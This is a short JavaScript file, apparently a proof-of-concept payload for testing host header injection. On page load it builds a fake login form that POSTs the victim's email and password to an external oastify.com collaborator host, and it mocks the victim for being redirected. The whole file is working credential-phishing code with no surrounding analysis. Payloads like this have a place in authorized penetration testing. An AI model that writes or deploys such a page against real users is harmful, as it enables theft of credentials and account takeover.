document.addEventListener("DOMContentLoaded", function() {
    // Create elements
    const title = document.createElement('title');
    title.textContent = 'TEST HOST HEADER INJECTION';

    const style = document.createElement('style');
    style.textContent = `
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        h1 {
            color: #333;
        }
        form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            color: #555;
        }
        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #007BFF;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        img {
            margin-top: 20px;
        }
    `;

    const h1 = document.createElement('h1');
    h1.textContent = 'Hello visitor!';

    const p = document.createElement('p');
    p.textContent = 'You just got redirected :)\nHope you did not input anything sensitive ;)';

    const img = document.createElement('img');
    img.src = 'https://media.tenor.com/EFDwfjT2GuQAAAAM/spinning-cat.gif';
    img.alt = 'Spinning Cat';

    const formTitle = document.createElement('h1');
    formTitle.textContent = 'Login Form';

    const form = document.createElement('form');
    form.action = 'https://pg9skevlq4m7jhc5cl5a81kf86ex2rqg.oastify.com';
    form.method = 'POST';

    const emailLabel = document.createElement('label');
    emailLabel.textContent = 'Email: ';
    const emailInput = document.createElement('input');
    emailInput.type = 'email';
    emailInput.name = 'email';
    emailInput.required = true;

    const passwordLabel = document.createElement('label');
    passwordLabel.textContent = 'Password: ';
    const passwordInput = document.createElement('input');
    passwordInput.type = 'password';
    passwordInput.name = 'password';
    passwordInput.required = true;

    const submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.textContent = 'Submit';

    // Append elements to the form
    form.appendChild(emailLabel);
    form.appendChild(emailInput);
    form.appendChild(passwordLabel);
    form.appendChild(passwordInput);
    form.appendChild(submitButton);

    // Append elements to the document
    document.head.appendChild(title);
    document.head.appendChild(style);
    document.body.appendChild(h1);
    document.body.appendChild(p);
    document.body.appendChild(img);
    document.body.appendChild(formTitle);
    document.body.appendChild(form);
});
